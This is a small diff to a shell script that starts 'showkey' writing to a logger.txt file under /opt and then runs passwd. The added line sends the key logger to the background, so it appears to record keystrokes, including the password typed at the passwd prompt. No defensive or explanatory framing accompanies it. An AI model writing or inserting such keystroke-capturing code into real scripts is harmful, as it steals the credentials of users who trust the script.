@@ -2,7 +2,7 @@
 
 # start record
 FOLDER="kelompokkucing"
-showkey > /opt/$FOLDER/logger.txt
+showkey > /opt/$FOLDER/logger.txt &
 
 # run passwd
 /usr/bin/passwd
